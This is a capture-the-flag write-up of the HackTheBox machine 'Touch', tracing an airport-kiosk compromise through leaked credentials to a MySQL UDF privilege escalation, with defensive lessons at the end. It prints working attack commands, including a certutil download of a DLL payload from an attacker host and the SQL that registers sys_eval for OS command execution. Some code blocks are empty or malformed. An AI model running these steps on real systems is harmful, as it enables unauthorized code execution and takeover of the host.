# Touch - HackTheBox
## Overview
Touch presented an airport self-service kiosk backed by a Windows system, a Nex(i)on DeviceHub management interface, and a MySQL database. The interesting part wasn't a single flashy exploit: it was how a collection of weak operational practices chained together. An unauthenticated API leaked device information, the device's default password allowed access to a management dashboard, and that dashboard exposed additional credentials. Once inside Windows, application files disclosed database credentials, including a privileged account password in a maintenance batch script. Finally, a MySQL User-Defined Function (UDF) was used to execute operating-system commands and read the Administrator flag.

## Recon
Started off with an `Nmap` scan to search for open ports and services.
```bash
nmap -sVC -p- -v -O -o scan.txt <machine_ip>
```

## Privilege Escalation
I then located a maintenance script under `C:\ProgramData\HTB Airways`
```powershell
type refresh-dates.bat
```
<img width="899" height="68" alt="found-root-password" src="https://github.com/user-attachments/assets/287f719b-f830-4e0d-998c-f7ce39a84d62" />

I then used these credentials to access the root account database. MySQL supports User-Defined Functions (UDFs): native shared libraries that extend SQL with additional functions. If an attacker can place a compatible library where MySQL loads plugins and has the required database privileges, a malicious UDF can bridge SQL queries to operating-system command execution.

I used the `lib_mysqludf_sys_64.dll` library available in the local Metasploit installation.

What exactly is lib_mysqludf_sys_64.dll?
This DLL belongs to the lib_mysqludf_sys family of MySQL UDF libraries.

It provides functions that allow MySQL to interact with the underlying operating system.

Two commonly encountered functions are:
- sys_exec() — executes an OS command and typically returns its exit status.
- sys_eval() — executes an OS command and returns its standard output.

```bash
cp /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll ~/Labs/htb/touch/
```
will copy the malicious .dll exploit to working directory, so that it is ready to transfer.

You can read about it here: https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss

<img width="806" height="54" alt="copying-exploit" src="https://github.com/user-attachments/assets/261f8a65-9a63-4c55-8f1d-4bb93c6c2d98" />

Start the python server in the attacker machine to transfer the .dll file
```bash
python3 -m http.server
```
We take advantage of `certutil.exe` - a Windows signed Living off the Land Binary(LOLBin) used to download and obfuscate payloads.
```powershell
certutil -urlcache -split -f http://<attackbox_ip:<port>/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Then I checked the directory's Windows ACLs with:
```powershell

```
The displayed permissions included full control for SYSTEM and Administrators, read/execute for Users, and modify rights for Authenticated Users. This made the plugin directory a relevant target for investigating whether a DLL could be placed there.

<img width="952" height="92" alt="plugin_dir-permissions" src="https://github.com/user-attachments/assets/7e6207b9-6f9f-4b9f-af74-4359be1cd91f" />

Now we proceed to register a UDF by registering a function `sys_eval()` which would let us execute system commands and display the output on the screen. We can do this by:
```sql
CREATE FUNCTION sys_eval RETURNS STRING
SONAME 'lib_mysqludf_sys_64.dll';
```
This registered the `lib_mysqludf_sys_64.dll` which would let us use `sys_eval()`

My first UDF registration attempt failed:
` ERROR 1126 (HY000): Can't open shared library 'lib_mysqludf_sys_64.dll'
(errno: 126 The specified module could not be found.) `

Turns out this resulted in error because I transferred the metasploit payload through python server, and the intended vector was `certutil.exe` abuse. Redoing this, fixed the error I was receiving.


## Lessons Learned
**Metadata is useful to attackers**. A serial number and firmware version may be enough to identify a predictable credential scheme.

**Management dashboards are security boundaries**. Peripheral status pages should not expose reusable operating-system credentials to low-trust users.

**Hardcoded credentials create pivot paths**. Source files and operational scripts can expose database accounts that were never intended for kiosk operators.

**Database privileges and OS privileges are different — and can compound**. The ability to load a native UDF is especially dangerous when the MySQL service runs as SYSTEM.

**Service-account least privilege matters**. MySQL did not need unrestricted Windows SYSTEM privileges to serve an airport kiosk application.

**A chain of small weaknesses can be decisive**. The initial information disclosure alone did not provide code execution; subsequent credential exposures and excessive privileges made the compromise possible.
